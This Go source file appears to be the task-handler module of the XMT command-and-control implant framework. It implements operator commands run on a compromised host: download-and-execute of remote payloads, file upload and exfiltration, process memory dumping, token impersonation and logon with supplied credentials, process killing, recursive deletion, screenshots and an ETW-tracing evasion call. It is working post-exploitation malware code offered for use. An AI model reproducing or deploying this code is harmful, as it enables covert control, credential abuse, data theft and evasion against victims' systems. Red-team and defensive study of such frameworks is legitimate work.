// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"
	"io"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/evade"
	"github.com/iDigitalFlame/xmt/device/screen"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	taskIoDelete    uint8 = 0
	taskIoDeleteAll       = iota
	taskIoMove
	taskIoCopy
	taskIoTouch
	taskIoKill
	taskIoKillName
)

var (
	_ Callable = (*DLL)(nil)
	_ Callable = (*Zombie)(nil)
	_ Callable = (*Process)(nil)
	_ Callable = (*Assembly)(nil)
	_ backer   = (*data.Chunk)(nil)
	_ backer   = (*com.Packet)(nil)
)

type backer interface {
	WriteUint32Pos(int, uint32) error
}

// Callable is an internal interface used to specify a wide range of Runnabale
// types that can be Marshaled into a Packet.
//
// Currently the DLL, Zombie, Assembly and Process instances are supported.
type Callable interface {
	task() uint8
	MarshalStream(data.Writer) error
}

func (DLL) task() uint8 {
	return TvDLL
}
func (Zombie) task() uint8 {
	return TvZombie
}
func (Process) task() uint8 {
	return TvExecute
}
func (Assembly) task() uint8 {
	return TvAssembly
}

func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
	d, err := r.Int64()
	if err != nil {
		return err
	}
	if d <= 0 {
		return nil
	}
	t := time.NewTimer(time.Duration(d))
	select {
	case <-t.C:
	case <-x.Done():
	}
	t.Stop()
	return nil
}
func taskPull(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a, p string
		err     = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	o, err := man.WebRequest(x, u, a)
	if err != nil {
		return err
	}
	if o.StatusCode >= 400 {
		o.Body.Close()
		return xerr.Sub("invalid HTTP response", 0x67)
	}
	var (
		v = device.Expand(p)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0o755); err != nil {
		o.Body.Close()
		return err
	}
	n, err := f.ReadFrom(o.Body)
	o.Body.Close()
	w.WriteString(v)
	w.WriteInt64(n)
	return err
}
func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0o644); err != nil {
		return err
	}
	n := data.NewCtxReader(x, r)
	c, err := io.Copy(f, n)
	n.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(c)
	return err
}
func taskElevate(_ context.Context, r data.Reader, _ data.Writer) error {
	var f filter.Filter
	if err := f.UnmarshalStream(r); err != nil {
		return err
	}
	if f.Empty() {
		f = filter.Filter{Elevated: filter.True}
	}
	return device.Impersonate(&f)
}
func taskRevSelf(_ context.Context, _ data.Reader, _ data.Writer) error {
	return device.RevertToSelf()
}
func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		i os.FileInfo
	)
	if i, err = os.Stat(v); err != nil {
		return err
	}
	if w.WriteString(v); i.IsDir() {
		w.WriteBool(true)
		w.WriteInt64(0)
		return nil
	}
	w.WriteBool(false)
	w.WriteInt64(i.Size())
	// 0 - READONLY
	f, err := os.OpenFile(v, 0, 0)
	if err != nil {
		return err
	}
	n := data.NewCtxReader(x, f)
	_, err = io.Copy(w, n)
	n.Close()
	return err
}
func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a string
		z    bool
		err  = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadBool(&z); err != nil {
		return err
	}
	var f *filter.Filter
	if err = filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	var (
		e cmd.Runnable
		p string
	)
	if z {
		e, p, err = man.WebExec(x, w, u, a)
	} else {
		e, p, err = man.WebExec(x, nil, u, a)
	}
	if err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	e.SetParent(f)
	if err = e.Start(); err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if !z {
		if w.WriteUint64(uint64(e.Pid()) << 32); len(p) > 0 {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskPullExec.func1()")
				}
				e.Wait()
				os.Remove(p)
			}()
		}
		return nil
	}
	i := e.Pid()
	if err = e.Wait(); len(p) > 0 {
		os.Remove(p)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = e.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}
func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
	var f *filter.Filter
	if err := filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	return device.DumpProcess(f, w)
}
func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	switch w.WriteUint8(t); t {
	case taskIoKill:
		var i uint32
		if err = r.ReadUint32(&i); err != nil {
			return err
		}
		p, err1 := os.FindProcess(int(i))
		if err1 != nil {
			return err1
		}
		err = p.Kill()
		p.Release()
		return err
	case taskIoTouch:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		k := device.Expand(n)
		if _, err = os.Stat(k); err == nil {
			return nil
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		f, err1 := os.OpenFile(k, 0x242, 0o644)
		if err1 != nil {
			return err1
		}
		f.Close()
		return nil
	case taskIoDelete:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		return os.Remove(device.Expand(n))
	case taskIoKillName:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		e, err1 := cmd.Processes()
		if err1 != nil {
			return err1
		}
		var p *os.Process
		for i := range e {
			if !strings.EqualFold(n, e[i].Name) {
				continue
			}
			if p, err = os.FindProcess(int(e[i].PID)); err != nil {
				break
			}
			err = p.Kill()
			if p.Release(); err != nil {
				break
			}
		}
		e, p = nil, nil
		return err
	case taskIoDeleteAll:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		return os.RemoveAll(device.Expand(n))
	case taskIoMove, taskIoCopy:
		var n, d string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		var (
			s, f *os.File
			k    = device.Expand(n)
			u    = device.Expand(d)
		)
		// 0 - READONLY
		if s, err = os.OpenFile(k, 0, 0); err != nil {
			return err
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		if f, err = os.OpenFile(u, 0x242, 0o644); err != nil {
			s.Close()
			return err
		}
		v := data.NewCtxReader(x, s)
		c, err1 := io.Copy(f, v)
		v.Close()
		f.Close()
		w.WriteString(u)
		if w.WriteInt64(c); t == taskIoCopy {
			return err1
		}
		if err1 != nil {
			return err
		}
		return os.Remove(k)
	default:
		return xerr.Sub("invalid operation", 0x68)
	}
}
func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
	// NOTE(dij): This function is here and NOT in an OS-specific file as I
	//            hopefully will find a *nix way to do this also.
	var (
		u, d, p string
		err     = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&d); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	return device.ImpersonateUser(u, d, p)
}
func taskZeroTrace(_ context.Context, _ data.Reader, _ data.Writer) error {
	return evade.ZeroTraceEvent()
}
func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
	return screen.Capture(w)
}
